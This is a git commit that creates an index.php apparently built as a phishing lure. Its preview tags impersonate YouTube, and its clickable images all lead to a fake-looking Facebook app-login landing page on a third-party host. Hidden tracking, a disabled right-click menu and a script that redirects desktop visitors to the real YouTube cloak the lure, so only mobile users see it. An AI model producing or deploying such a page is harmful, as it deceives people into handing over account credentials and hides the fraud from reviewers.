64d2c962707a95ad4fc464deeac0426d80877b87
trinidad1994 <88596846+trinidad1994@users.noreply.github.com>
2021-12-04 15:19:56 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,33 @@
+<meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png" />
+<meta property="fb:app_id" content="87741124305" />
+
+
+<p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://fbapplogin.agilecrm.com/landing/4985962092363776" imageanchor="1" rel="nofollow" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="762" data-original-width="1312" height="372" src="https://blogger.googleusercontent.com/img/a/AVvXsEhddr_iCjn1CM85_Ca51qWiThbhrMhKl8y-gDp2fQQPqJHpX9JMTvMCWBqYSzE1Ihiz2fnt6riXvV-2T3V5LfFgiOLPcwo4XgBuY7dYb3OYFymKIDIH07X8jB_DmXlUs2Buw8HmEZhtj6OC6FFGEe0m4aaUQN7MIfmpUApO9gtYXcaU3GgkmGN3BtGO=w640-h372" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://fbapplogin.agilecrm.com/landing/4985962092363776" imageanchor="1" rel="nofollow" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="764" data-original-width="1315" height="372" src="https://blogger.googleusercontent.com/img/a/AVvXsEi-3AsHpc3nnk4c3qXlWmCYO88RLJIaGNmkfbKpzHsvfzH0AClAP_sTlwv2qsJ22n4FYwHk1JIcW85LCpuYpMDLmsDLVeblg3c4E1f78WyKAMwLQ2tF7BRglG6Adr6t8slwfMG5K9-27Ru5_1SLkq16pASZVqLGXee6auYcZ_5pRj-rGSts4wwgGHWM=w640-h372" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://fbapplogin.agilecrm.com/landing/4985962092363776" imageanchor="1" rel="nofollow" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="768" data-original-width="1315" height="374" src="https://blogger.googleusercontent.com/img/a/AVvXsEiBeNPauk5rQAPSFtPo4eaTn23qvc5x7lCJGnJzvOLY4lnphCxOKGGmK25VX3pwx1Ynaae0ylS3W9pspYfc5ZmPgHJdNWjo3epQ57RiRNgklIqxgpNLlYickHA7jpjyBH86KXEVG5If2DGOX2mVDHJE8n5RtaTNNmqtQhrSGdWJeSe6e6tknQHR7hg1=w640-h374" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://fbapplogin.agilecrm.com/landing/4985962092363776" imageanchor="1" rel="nofollow" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="762" data-original-width="1313" height="372" src="https://blogger.googleusercontent.com/img/a/AVvXsEhDAv9yY5FBnYtoqB0pkOe9qE4PF15dlu6LzSuRaeDR9pQXUWfPe3C8eoC8EVYzA2_Ju3KwkJ2Bc3YAovQqy82sx3xHVG-awrEYvIJ42Yz1Lt5GyfIqtc2-Xe9Dbft8e6qagwDI2x5dtuytsB1PgSxicylkqNEDADe0_mUU3OgueW3w6Tc7SsWwe6Xi=w640-h372" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://fbapplogin.agilecrm.com/landing/4985962092363776" imageanchor="1" rel="nofollow" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="761" data-original-width="1315" height="370" src="https://blogger.googleusercontent.com/img/a/AVvXsEiBh7B9ljcw_Rk3TlMl5c90nzOn8GtzFJsfAQfA6BfkYwqcofDBvKZv2e2bjoRkx3G2XTRWAEus5qW9JsmpwI9GiCL98PU22VBQaewBvAOu_60gpQgtzMxs5ed8YnjZ87HARnrjhX89nk1_6GaWHbIKPKNLM0OLNf_DW6C0NWi68kGgppdxuGaRlrYZ=w640-h370" width="640" /></a></div><br />&nbsp;<p></p>
+
+<div style="VISIBILITY: hidden;"> <script type="text/javascript" src="//widgets.amung.us/small.js"></script><script type="text/javascript">WAU_small('1si0uzxbdr')</script></div>
+
+<script type='text/javascript'>
+	document.oncontextmenu = function(){return false}
+</script>
+</script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+ function h(r, a) { var t = ""; if ("mix" == a) var h = 
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; else var h = 
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * 
+h.length)); return t };
+
+        var device = navigator.userAgent
+        
+        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
+        {
+         
+        }else
+{
+window.location = "https://www.youtube.com/?/"
+}
+//]]>
+</script>
+
